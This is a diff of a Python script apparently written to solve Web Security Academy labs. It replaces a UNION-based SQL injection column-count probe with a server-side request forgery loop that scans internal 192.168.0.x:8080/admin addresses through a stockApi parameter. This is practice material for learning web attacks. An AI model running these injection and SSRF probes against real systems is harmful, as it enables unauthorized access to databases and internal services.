@@ -1,17 +1,19 @@
 import requests
-base = 'https://0a21001604371a33806190ef0014006a.web-security-academy.net/filter?category='
-# We'll iterate through a reasonable number of columns (1-8)\
+import urllib.parse
+base_url = "https://0ae60048046c1334808285fd0093004c.web-security-academy.net/product/stock"
 
-for n in range(1, 9):
-    injected = "' UNION SELECT {}-- ".format(','.join(['NULL'] * n))
-    url = base + requests.utils.quote(injected)
-    r = requests.get(url)
+# Scan remaining range
+for i in range(11, 256):
+    ip = f"192.168.0.{i}"
+    admin_url = f"http://{ip}:8080/admin"
+    encoded_admin_url = urllib.parse.quote(admin_url, safe="")
+    params = {"stockApi": encoded_admin_url}
+    try:
+        resp = requests.get(base_url, params=params, timeout=5)
+        print(f"Trying {ip}: (status, len) => {resp.status_code}, {len(resp.content)}")
+        print(resp.text)
 
-    print(injected, r.status_code, len(r.text))
-
-    if 'Internal Server Error' not in r.text and 'SQL' not in r.text and r.status_code == 200:
-        print(f"Likely correct column count: {n}\n")
-        print(r.text[:500])
-        break
-    else:
-        print(f"Column count {n} failed.")
+        if resp.status_code != 405:
+            break
+    except Exception as e:
+        print(f"Exception for {ip}: {e}")
